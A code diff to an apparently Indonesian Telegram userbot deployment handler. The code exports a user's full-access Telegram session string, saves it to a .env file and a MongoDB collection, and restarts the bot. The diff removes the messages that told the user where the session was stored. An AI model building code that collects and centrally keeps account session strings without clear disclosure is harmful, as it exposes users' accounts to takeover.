@@ -65,13 +65,7 @@ MSG = """
     group=3
 )
 async def recv_tg_tfa_message(_, message: Message):
-    ex = await bots.get_me()
-    expired_date = await get_expired_date(ex.id)
-    if expired_date is None:
-        expired_date = "Belum di tetapkan"
-    else:
-        remaining_days = (expired_date - datetime.now()).days
-
+    
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
     if not w_s_dict:
         return
@@ -105,11 +99,7 @@ async def recv_tg_tfa_message(_, message: Message):
         filename = ".env"
         with open(filename, "a") as file:
             file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
-        await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{count}.")
-        await saved_message_.reply_text(
-            SESSION_GENERATED_USING,
-            quote=True
-        )
+        await message.reply_text("`Berhasil Melakukan Deploy.`")
         session_data = {
             "session_string": session_string,
             "user_id": message.chat.id,
@@ -118,13 +108,14 @@ async def recv_tg_tfa_message(_, message: Message):
             "last_name": message.chat.last_name or "",
         }        
         mongo_collection.insert_one(session_data)
+        await asyncio.sleep(2.0)
         try:
-            msg = await message.reply(" `Restarting bot...`")
+            await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
             LOGGER(__name__).info("BOT SERVER RESTARTED !!")
         except BaseException as err:
             LOGGER(__name__).info(f"{err}")
             return
-        await msg.edit_text("✅ **Bot has restarted !**\n\n")
+        
         if HAPP is not None:
             HAPP.restart()
         else:
